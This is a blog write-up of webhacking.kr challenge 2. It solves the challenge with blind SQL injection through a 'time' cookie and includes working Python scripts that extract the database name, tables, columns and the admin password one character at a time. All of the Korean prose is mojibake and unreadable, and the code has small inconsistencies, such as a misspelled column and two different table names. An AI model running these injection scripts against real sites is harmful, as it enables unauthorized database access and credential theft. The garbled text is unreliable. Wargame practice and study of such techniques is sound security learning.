---
title: "[webhacking.kr] 2ë²ˆ ë¬¸ì œ í’€ì´[Blind SQL Injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - blind sql injection
toc: true
toc_sticky: true
toc_label: "2ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/webhacking.jpg
---

ğŸ’¡ Webhacking.kr challenge(old) 2ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
## ë¬¸ì œ í™”ë©´ & ë¬¸ì œ ë¶„ì„
  2ë²ˆ ë¬¸ì œëŠ” ì¼ë‹¨ ë¬´ì—‡ì„ í•´ì•¼ í•˜ëŠ”ì§€ ë¶€í„° ì°¾ì•„ì•¼ í•˜ëŠ” ë¬¸ì œì˜€ìŠµë‹ˆë‹¤. ë©”ì¸ í˜ì´ì§€ë¥¼ ë“¤ì–´ê°€ë©´, IPê°€ ë¡œê·¸ë˜ê³  ìˆë‹¤ëŠ” ë‚´ìš©ë°–ì— ì—†ê¸° ë•Œë¬¸ì— **ê°œë°œì ëª¨ë“œ**ì™€ ì¿ í‚¤ ê°’ì„ ë¨¼ì € í™•ì¸í•´ ë´…ë‹ˆë‹¤.

 ![image](https://user-images.githubusercontent.com/33647663/150627725-6d83d9bb-32ce-4103-91c5-88a32be657fd.png){: .align-center}

  ì¼ë‹¨ ì¿ í‚¤ ê°’ì—ëŠ” 'time'ì´ë¼ëŠ” ì¿ í‚¤ê°€ ìˆì—ˆìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150627776-6671c9bc-b629-4a89-9824-70f883322cfd.png){: .align-center}

  ê·¸ ë‹¤ìŒ í˜ì´ì§€ ì†ŒìŠ¤ì½”ë“œë¥¼ ë³´ë©´, ë‹¤ìŒê³¼ ê°™ì´ ~~ì¹œì ˆíˆ~~ admin.phpë¡œ ë“¤ì–´ê°€ ë³´ë¼ê³  ê°€ë¥´ì³ ì¤ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150627800-2c1a3cdc-4b68-4729-b6bc-73dbd6217b39.png){: .align-center}

  admin.phpì—ëŠ” ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ëŠ” ì¹¸ì´ ìˆìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150627812-a2c70482-cbad-4de1-90c5-5c8079c334a6.png){: .align-center}

  ![image](https://user-images.githubusercontent.com/33647663/150627831-a837bb74-6c71-4fc3-867f-5e5acf636441.png){: .align-center}

  ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ëŠ” ì¹¸ì— ```admin```, ```guest```, ```' or 1=1-- ```ê°’ì„ ì…ë ¥í•´ë³´ë©´ ë¹„ë°€ë²ˆí˜¸ê°€ í‹€ë ¸ë‹¤ê³  ë‚˜ì˜¤ëŠ” ê±¸ ë³´ë‹ˆ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì•Œì•„ë‚´ì„œ ì…ë ¥í•˜ë©´ í’€ë¦¬ëŠ” ë¬¸ì œë¡œ ì¶”ì¸¡ë©ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150627878-0dc1e212-b45d-4276-a71d-f5d64aeda449.png){: .align-center}

  ì¼ë‹¨ ì—¬ê¸°ê¹Œì§€ëŠ” ë°©í–¥ì„ ëª»ì¡ì•˜ëŠ”ë° ë¬¸ì œì—ì„œ íŒíŠ¸ì¸ ```ë„ˆì˜ IPê°€ ê¸°ë¡ë˜ê³  ìˆë‹¤```ë¥¼ ì´ìš©í•´ ë³´ê¸° ìœ„í•´ì„œ Burp_suiteë¡œ íŒ¨í‚·ì„ ì¡ì•„ë´…ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150627979-89945971-7ccb-4c8c-8cd7-463b6f70627f.png){: .align-center}

  ì¡ì•„ë´ë„ íŠ¹ë³„í•œê±´ ì—†ëŠ”ë°, ì¿ í‚¤ ê°’ì— 'time'ì´ ìˆë‹¤ëŠ”ê²Œ ì˜ì‹¬í•´ ë³¼ ë§Œí•œ ë¶€ë¶„ì…ë‹ˆë‹¤. ì›ë˜ëŠ” ì„œë²„ì—ì„œ ì‹œê°„ì„ ê³„ì‚°í•´ì„œ ì²˜ë¦¬í•˜ì§€ í´ë¼ì´ì–¸íŠ¸ë¡œ ì‹œê°„ê°’ì„ ì¿ í‚¤ë¡œ ì£¼ëŠ” ê²½ìš°ëŠ” ì—†ê¸° ë•Œë¬¸ì— ì € ë¶€ë¶„ì„ ë°”ê¿”ë´…ë‹ˆë‹¤. ë‹¤ìŒ ê·¸ë¦¼ì²˜ëŸ¼ í´ë¼ì´ì–¸íŠ¸ê°€ ì£¼ëŠ” ì‹œê°„ê°’ì— ë”°ë¼ì„œ ì£¼ì„ì˜ ì‹œê°„ì´ ë°”ë€ŒëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150628153-9a17f1a6-fd0d-4f53-acef-ea86520945a5.png){: .align-center}

  ì—¬ê¸°ê¹Œì§€ê°€ ì œê°€ ì•Œì•„ë‚¸ ë¶€ë¶„ì´ê³ ,,, ê·¸ ë’¤ë¡œëŠ” ë­ ì–´ë–¤ê±¸ í•´ì•¼í•  ì§€ ëª¨ë¥´ê² ì–´ì„œ,,, ë¬´ì—‡ë³´ë‹¤ ë¬¸ì œ í˜ì´ì§€ì—ì„œ IPê°€ ê¸°ë¡ë˜ê³  ìˆë‹¤ëŠ” ë¶€ë¶„ì˜ íŒíŠ¸ë¥¼ ì´ìš©í•˜ì§€ ëª»í•˜ëŠ” ê±° ê°™ì•„ì„œ ê·¸ ë¶€ë¶„ì„ ìœ„ì£¼ë¡œ ì‚½ì§ˆì„ ì¢€ í•´ë³´ë‹¤ê°€ ê·¸ë˜ë„ ëª»ì°¾ì•˜ìŠµë‹ˆë‹¤  ã…œã…œ 

  ê·¸ë˜ì„œ ë‹¤ë¥¸ í¬ìŠ¤íŒ…ì„ ì°¸ê³ í•´ ë´¤ë”ë‹ˆ time ë¶€ë¶„ì„ ì´ìš©í•´ì„œ sql injectionì„ í•˜ë”ë¼êµ¬ìš”??? ì—¬ëŸ¬ê°œë¥¼ ì½ì–´ ë´¤ëŠ”ë° ë‹¤ë“¤ ë‹¤ì§œê³ ì§œ injectionì„ í•˜ê¸´ í•˜ë˜ë° ì†”ì§íˆ ì•„ì§ê¹Œì§€ë„ ì™œ ì„œë²„ì—ì„œ ì£¼ì„ì— ë“¤ì–´ê°€ëŠ” ë¶€ë¶„ì´ DBì—ì„œ ì¿¼ë¦¬ë¥¼ í†µí•œ ê²°ê³¼ê°€ ë‚˜ì˜¤ëŠ”ì§€ ì´í•´ê°€ ì•ˆê°€ê¸´ í•©ë‹ˆë‹¤...

  ì œê°€ ìƒê°í•œ ì½”ë“œ íë¦„ì€ **1**ì²˜ëŸ¼ ì‚¬ìš©ìì˜ ì¿ í‚¤ ê°’ì„ ë°›ì•„ì„œ ê·¸ëŒ€ë¡œ ì£¼ì„ì— ë„£ì–´ì£¼ëŠ” ê±°ì˜€ëŠ”ë°, ì§€ê¸ˆ ë¬¸ì œì˜ ê²½ìš°ì—ëŠ” ì‚¬ìš©ìí•œí…Œ ë°›ì€ ì‹œê°„ê°’ì„ êµ³ì´ DBì— ì ‘ì†ì„ í•œë‹¤ìŒ ë­” ì§“ì„ í•œë‹¤ëŠ” ê±´ë° ì¡°ê¸ˆ ì–µì§€ì¸ ëŠë‚Œì¸,,, sudo ì½”ë“œë¡œ ì‘ì„±ì„ í•´ë³´ë ¤ê³  í•´ë„ ì˜ ì•ˆë˜ë„¤ìš”

  ```php
  // ë‚´ê°€ ìƒê°í•œ ì„œë²„ìª½ php ì‘ë™ ë¡œì§
  <? php
   $time = $_COOKIES['time']
   $timeì„ ë‚ ì§œ í˜•ì‹ìœ¼ë¡œ ë³€í™˜í•˜ëŠ” ë¡œì§
  echo("<!------ {$time} ---->");
  ?>
  ```

 ```php
 // ë¬¸ì œì—ì„œ ì‹¤ì œë¡œ ì‘ë™í•˜ëŠ” ë¡œì§ì€ ì‚¬ìš©ìì˜ timeê°’ì´ DBë¥¼ ê±°ì¹˜ê²Œ ë˜ì–´ìˆìŒ.
  <? php
  $time = $_COOKIES['time']
  $DB = dbconnect();

  // DBì—ì„œ insert í›„ Select 
  // ë¬´ìŠ¨ ë‚´ìš©ì„ insert í•˜ëŠ”ì§€ëŠ” ëª¨ë¥´ê² ìŒ
  // sql("select time from chall2 where ~"); ì´ëŸ°ì‹ìœ¼ë¡œ ?
 ```

  ë­ ì•„ë¬´íŠ¼ time ë¶€ë¶„ì´ DBì˜ ì¿¼ë¦¬ë¡œ ë“¤ì–´ê°€ê³ , ì°¸ì¸ê²½ìš°ì™€ ê±°ì§“ì¸ ê²½ìš° ë‹¤ìŒì²˜ëŸ¼ ì‘ë‹µê°’ì— ì°¨ì´ê°€ ë‚˜ì˜¨ë‹¤ëŠ” ê²ƒì„ í™•ì¸í–ˆìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150628768-dd728134-8e24-434d-a857-a4385b59139b.png){: .align-center}
  ![image](https://user-images.githubusercontent.com/33647663/150628773-cf6d0aee-805c-44e7-ae46-7f67f53ca4e9.png){: .align-center}

  ì´ì œ ì°¸ ê±°ì§“ì— ë”°ë¥¸ ì‘ë‹µ ê°’ì„ ì•Œ ìˆ˜ ìˆìœ¼ë¯€ë¡œ Blind Sql injection ê³µê²©ì„ ìˆ˜í–‰í•˜ê² ìŠµë‹ˆë‹¤.


# ë¬¸ì œ í’€ì´
 ì§€ê¸ˆ ì²˜ëŸ¼ ì•„ë¬´ ê²ƒë„ ì—†ëŠ” ìƒíƒœì—ì„œ Blind Sql injectionì„ ìˆ˜í–‰í•˜ë ¤ë©´ ë‹¤ìŒì˜ ë‹¨ê³„ë¥¼ ê±°ì³ì•¼ í•©ë‹ˆë‹¤
 
 1. DB ëª…ì„ ì•Œì•„ë‚´ê¸° 
  ```sql
  database()
  ```
 2. table ëª…ì„ ì•Œì•„ë‚´ê¸°
  ```sql
  select table_name from information_schema.tables where table_schema = [DBëª…]
  ```
 3. column ëª…ì„ ì•Œì•„ë‚´ê¸°
  ```sql
  select column_name from information_schema.columns where table_name = [table ëª…]
  ```
 4. í•´ë‹¹ ì»¬ëŸ¼ì—ì„œ ë°ì´í„° ë½‘ê¸°
  ```sql
  select [columnëª…] from [table ëª…] 
  ```

  ì €ëŠ” ëª¨ë“  ë¬¸ì œë¥¼ íŒŒì´ì¬ ì½”ë“œë¥¼ ì œì‘í•˜ì—¬ ëŒë ¸ìŠµë‹ˆë‹¤. 

## 1. DBëª… êµ¬í•˜ê¸°
  ìš°ì„  DBëª…ì„ êµ¬í•˜ê¸° ìœ„í•´ì„œ database()í•¨ìˆ˜ì˜ ê²°ê³¼ê°’ì„ ì°¾ëŠ” í˜ì´ë¡œë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤
  ```python
  payload = 'ascii(substr(database(),{},1)) < {}'.format(i,search)
  ```
  database()ì´ë¦„ì˜ í•œê¸€ìì”© ë°˜ë³µí•´ì„œ ascii ì½”ë“œë¡œ ìˆ«ì ë³€í™˜ì„ í•œ í›„, ë¹„êµí•˜ë ¤ëŠ” ìˆ«ìì™€ í¬ê¸° ë¹„êµë¥¼ í–ˆìŠµë‹ˆë‹¤. ì´ë•Œ ì €ëŠ” Binary Search ì•Œê³ ë¦¬ì¦˜ì„ í™œìš©í•˜ì—¬ íš¨ìœ¨ì ìœ¼ë¡œ ì¿¼ë¦¬ë¥¼ ì œì‘í–ˆìŠµë‹ˆë‹¤. 


  ```python
  def get_database_name():
    database_length = get_database_length()
    database = ''
    for i in tqdm(range(1,database_length+1),desc="get database_name"):
        start,end = 1,127
        while True:
            search = int((start + end )/2)
            payload = 'ascii(substr(database(),{},1)) < {}'.format(i,search)
            cookies['time'] = payload
            response = requests.get(url,cookies=cookies)
            if(TRUE_FLAG in response.text):
                end = search
            else:
                start = search
            if(start == end):
                database += chr(start)
                break
            if(start == end -1 ):
                payload = 'ascii(substr(database(),{},1)) = {}'.format(i,start)
                cookies['time'] = payload
                response = requests.get(url,cookies=cookies)
                if(TRUE_FLAG in response.text):
                    database +=chr(start)
                    break
                else:
                    database +=chr(end)
                    break
    print("find the database name : ",database)
    return database
  ```
  
  ì´ë ‡ê²Œ í•´ì„œ ë‹¤ìŒê³¼ ê°™ì´ ë°ì´í„° ë² ì´ìŠ¤ ì´ë¦„ ```chall2```
  ë¥¼ êµ¬í–ˆìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150646346-c1f18e31-b532-4686-9ff6-e3a514677632.png)


## 2. tableëª… êµ¬í•˜ê¸°
  table ëª…ì€ information_schema ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì´ìš©í•´ì„œ êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. information_schema.tables í…Œì´ë¸”ì—ëŠ” mysql ë°ì´í„°ë² ì´ìŠ¤ì— ì¡´ì¬í•˜ëŠ” ëª¨ë“  í…Œì´ë¸”ì— ëŒ€í•œ ì •ë³´ê°€ ë“¤ì–´ìˆìœ¼ë©°, ì €ëŠ” chall2ì— ì¡´ì¬í•˜ëŠ” ëª¨ë“  í…Œì´ë¸”ì„ ì°¾ëŠ” ì¿¼ë¦¬ë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì œì‘í–ˆìŠµë‹ˆë‹¤.

  ìš°ì„  chall2ì— ëª‡ê°œì˜ í…Œì´ë¸”ì´ ìˆëŠ”ì§€ë¥¼ ë¨¼ì € êµ¬í•©ë‹ˆë‹¤. 
  ë‹¤ìŒê³¼ ê°™ì€ ì¿¼ë¦¬ë¬¸ì„ ì‘ì„±í•˜ë©´, chall2 ë°ì´í„°ë² ì´ìŠ¤ì— í…Œì´ë¸”ì´ ëª‡ê°œ ìˆëŠ”ì§€ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

  ```sql
  select count(*) from information_schema.tables where talbe_schema='chall2';
  ```
  
  ì´ë¥¼ ì´ìš©í•˜ì—¬ íŒŒì´ì¬ ì½”ë“œë¡œ ë‹¤ìŒê³¼ ê°™ì´ chall2 ë°ì´í„°ë² ì´ìŠ¤ì—ëŠ” 2ê°œì˜ tableì´ ì¡´ì¬í•¨ì„ ì°¾ì•˜ìŠµë‹ˆë‹¤.
  ```python
  def get_number_of_tables():
    for i in range(10):
        payload = "(select count(*) from information_schema.tables where table_schema='chall2') = {}".format(i)
        cookies['time'] = payload
        response = requests.get(url,cookies=cookies)
        if(TRUE_FLAG in response.text):
            print("number_of_tables : ",i)
            return i
  ```

  ê·¸ ë‹¤ìŒì€ í…Œì´ë¸” ì´ë¦„ì„ ì°¾ì•˜ìŠµë‹ˆë‹¤. ì´ë•Œ, í…Œì´ë¸” ëª…ì´ í•˜ë‚˜ê°€ ì•„ë‹ˆê¸° ë•Œë¬¸ì— ìˆœì°¨ì ìœ¼ë¡œ ì´ë¦„ì„ ì°¾ê¸° ìœ„í•´ì„œ limit 0,1ì„ ë¶™ì—¬ì¤ë‹ˆë‹¤.
  ```sql
  select table_name from information_schema.tables where table_schema = 'chall2' limit 0,1
  ```

  ìœ„ì˜ sqlì„ ì ìš©í•œ íŒŒì´ì¬ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. payload ë¶€ë¶„ì´ injectionì„ ì‹œë„í•œ ë¶€ë¶„ì´ê³ , ë™ì¼í•˜ê²Œ Binary Search ì•Œê³ ë¦¬ì¦˜ì„ ì ìš©í•˜ì˜€ìŠµë‹ˆë‹¤.
  ```python
  def get_table_name(table_index):
    table_name = ''
    length = get_table_length(table_index)
    for i in tqdm(range(1,length+1),desc="get table_name"):
        start,end = 1,127
        while True:
            search = int((start + end)/2)
            payload = "(select ascii(substr(table_name,{},1)) from information_schema.tables where table_schema='chall2' limit 0,1) < {}".format(i,search)
            cookies['time'] = payload
            response = requests.get(url,cookies = cookies)
            result = response.text[23:24]
            if(result == '1'):
                end = search
            else:
                start = search

            if(start == end):
                table_name += chr(start)
                break
            if(start == end-1):
                payload = "(select ascii(substr(table_name,{},1)) from information_schema.tables where table_schema='chall2' limit 0,1) = {}".format(i,start)
                cookies['time'] = payload 
                response = requests.get(url,cookies=cookies)
                result = response.text[23:24]
                if(result == '1'):
                    table_name +=chr(start)
                    break
                else:
                    table_name +=chr(end)
                    break
    return table_name
  ```

  íŒŒì´ì¬ ì½”ë“œ ì‹¤í–‰ ê²°ê³¼, ì‘ë‹µê°’ì€ ë‹¤ìŒê³¼ ê°™ì´ ì¶œë ¥í•´ ì¤¬ê³  í…Œì´ë¸”ëª…ì€ **admin_area_pw** í…Œì´ë¸”ê³¼, **adm**í…Œì´ë¸” 2ê°œê°€ ìˆì—ˆìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150646799-3f492125-7018-41b7-98c0-9961c3426ad6.png)

## 3. column ëª… êµ¬í•˜ê¸°
  column ëª…ë„ table ëª…ê³¼ êµ¬í•˜ëŠ” ë¡œì§ì€ 100í¼ì„¼íŠ¸ ë™ì¼í•©ë‹ˆë‹¤. inforamtion_schema.columns í…Œì´ë¸”ì˜ column_name ê°’ì„ í†µí•´ì„œ êµ¬í•  ìˆ˜ ìˆê³  column ëª…ë„ table ëª…ì„ êµ¬í•˜ëŠ” ë¡œì§ê³¼ ë™ì¼í•˜ê²Œ í•´ë‹¹ í…Œì´ë¸”ì— ëª‡ê°œì˜ ì»¬ëŸ¼ì´ ìˆëŠ”ì§€ í™•ì¸í•œ í›„ì— ê°ê°ì˜ ì»¬ëŸ¼ ì´ë¦„ì„ ëª¨ë‘ êµ¬í•´ì¤˜ì•¼ í•©ë‹ˆë‹¤. 

  ```sql
  select count(*) from information_schema.columns where table_name="admin_area_pw"
  ```

  ```sql
  select column_name from information_schema.columns where table_name="admin_area_pw" limit 0,1
  ```

  ì»¬ëŸ¼ ëª…ì„ êµ¬í•˜ê¸° ìœ„í•´ í•„ìš”í•œ sql ë¡œì§ì€ ìœ„ì™€ ê°™ìœ¼ë©° ì´ë¥¼ ë°˜ë³µë¬¸ì„ ì´ìš©í•˜ì—¬ íŒŒì´ì¬ ì½”ë“œë¡œ ì‘ì„±í•˜ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

  ```python
  def get_number_of_columns(table_name):
    for i in range(10):
        payload = "(select count(column_name) from information_schema.columns where table_name='{}') = {}".format(table_name,i)
        cookies['time'] = payload
        response = requests.get(url,cookies=cookies)
        if(TRUE_FLAG in response.text):
            print("number of columns :",i)
            return i
  ```

  ```python
  def get_column_name(table_name,column_index):
    column_length = get_column_length(table_name,column_index)
    column_name = ''
    for i in tqdm(range(1,column_length+1),desc="get column_name"):
        start,end = 1,127
        while True:
            search = int((start + end)/2)
            payload = "(select ascii(substr(column_name,{},1)) from information_schema.columns where table_name='{}' limit {},1) < {}".format(i,table_name,column_index,search)
            cookies['time'] = payload
            response = requests.get(url,cookies=cookies)
            if(TRUE_FLAG in response.text):
                end = search
            else:
                start = search

            if(end == start):
                column_name +=chr(start)
                break
            if(start == end-1):
                payload = "(select ascii(substr(column_name,{},1)) from information_schema.columns where table_name='{}' limit {},1) = {}".format(i,table_name,column_index,start)
                cookies['time'] = payload
                response = requests.get(url,cookies=cookies)
                if(TRUE_FLAG in response.text):
                    column_name +=chr(start)
                    break
                else:
                    column_name +=chr(end)
                    break
    print("table : {}, column_index : {} -> column_name : {}".format(table_name,column_index,column_name))
    return column_name
  ```

  í…Œì´ë¸” ëª…ì„ êµ¬í•˜ëŠ” ë¡œì§ê³¼ ë™ì¼í•˜ê¸° ë•Œë¬¸ì— ì½”ë“œì— ëŒ€í•œ ì„¤ëª…ì€ ì¶”ê°€ì ìœ¼ë¡œ í•˜ì§€ ì•Šê² ìŠµë‹ˆë‹¤.

  ì½”ë“œ ì‹¤í–‰ê²°ê³¼ëŠ” **admin_area_pw** í…Œì´ë¸”ì—ëŠ” **pw** ì»¬ëŸ¼ì´ í•˜ë‚˜ ìˆì—ˆê³ , **adm**í…Œì´ë¸”ì—ëŠ” ì»¬ëŸ¼ì´ ì—†ì—ˆìŠµë‹ˆë‹¤.

  ê·¸ë˜ì„œ ë³¸ ë¬¸ì œì—ì„œëŠ” admin_area_pw í…Œì´ë¸”ì˜ pw ì»¬ëŸ¼ì— ìˆëŠ” ê°’ì„ êµ¬í•´ì˜¤ë©´ ë©ë‹ˆë‹¤.

# 4. data êµ¬í•˜ê¸°
  table ëª…, column ëª…ì„ ì•Œì•˜ìœ¼ë‹ˆ dataë¥¼ êµ¬í•˜ëŠ” ë¡œì§ì€ ë§¤ìš° ì¹œìˆ™í•œ sql ë¬¸ìœ¼ë¡œ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê³¼ì •ì„ ì„ í–‰í•˜ê¸° ì „ì— ê³„ì† ì„¤ëª…í–ˆë“¯ì´ ë°ì´í„°ê°€ ëª‡ê°œ ë“¤ì–´ìˆëŠ”ì§€ ë¨¼ì € êµ¬í•´ì•¼ í•©ë‹ˆë‹¤.

  ```sql
  select count(*) from adm_area_pw
  ```
  ìœ„ì˜ ì¿¼ë¦¬ë¬¸ ê²°ê³¼ë¥¼ blind_sql_injection í•´ë³¸ ê²°ê³¼ ë°ì´í„°ê°€ í•˜ë‚˜ ë“¤ì–´ ìˆì—ˆìŠµë‹ˆë‹¤.

  ì´ì œ ë‹¤ìŒ ì¿¼ë¦¬ë¬¸ì„ ì´ìš©í•˜ì—¬ ìµœì¢… ë°ì´í„° ê°’ì„ êµ¬í•˜ë©´ ë©ë‹ˆë‹¤.

  ```sql
  select pw from adm_area_pw limit 0,1
  ```

  ìœ„ì˜ sql ë¬¸ë“¤ì„ blind sql injectionì„ ì´ìš©í•˜ì—¬ íŒŒì´ì¬ ì½”ë“œë¡œ ì‘ì„±í•˜ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

  ```python
  def get_data(table_name,column_name,data_index):
    data_length = get_data_length(table_name,column_name,data_index)
    data = ''
    for i in tqdm(range(1,data_length+1),desc="get data"):
        start,end = 1,127
        while True:
            search = int((start + end)/2)
            payload = "(select ascii(substr({},{},1)) from {} limit {},1) < {} ".format(column_name, i,table_name,data_index,search)
            cookies['time'] = payload
            response = requests.get(url,cookies=cookies)
            if(TRUE_FLAG in response.text):
                end = search
            else:
                start = search

            if(end == start):
                data +=chr(start)
                break
            if(start == end-1):
                payload = "(select ascii(substr({},{},1)) from {} limit {},1) = {} ".format(column_name, i,table_name,data_index,start)
                cookies['time'] = payload
                response = requests.get(url,cookies=cookies)
                if(TRUE_FLAG in response.text):
                    data +=chr(start)
                    break
                else:
                    data +=chr(end)
                    break
    print("table : {}, column_name : {} -> data : {}".format(table_name,column_name,data))
    return column_name
  ```

  ê·¸ë¦¬ê³  ì½”ë“œ ì‹¤í–‰ê²°ê³¼ **pw**ê°’ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150647195-248186f6-c856-4da9-a2f3-5d73903f9b0b.png)
  

  ë³¸ ë¬¸ì œì—ì„œ ì‚¬ìš©í•œ ì½”ë“œëŠ” ì œ [ê¹ƒí—ˆë¸Œ](https://github.com/kangmyoungseok/webhacking-kr/blob/main/02-blind_injection2.py)ì— ì˜¬ë ¤ ë†“ì•˜ìœ¼ë‹ˆ ì°¸ê³ í•´ ë³´ì‹œë©´ ë  ê²ƒ ê°™ìŠµë‹ˆë‹¤. ì„¤ëª…í•  ë‚´ìš©ì´ ì›Œë‚™ ë§ì•„ì„œ ì¤‘ê°„ë¶€í„°ëŠ” ì–´ëŠì •ë„ ê¸°ë³¸ì´ ë˜ëŠ” ë‚´ìš©ì€ ì„¤ëª…ì„ ìƒëµí•´ì„œ ì¢€ ë¶ˆì¹œì ˆí•œ ëŠë‚Œì´ ìˆê¸´í•œë°, ì´í•´ ì•ˆê°€ì‹œëŠ” ë‚´ìš©ì„ ì•Œë ¤ì£¼ì‹œë©´ ì ê·¹ì ìœ¼ë¡œ ë„ì™€ë“œë¦¬ê² ìŠµë‹ˆë‹¤ :D .




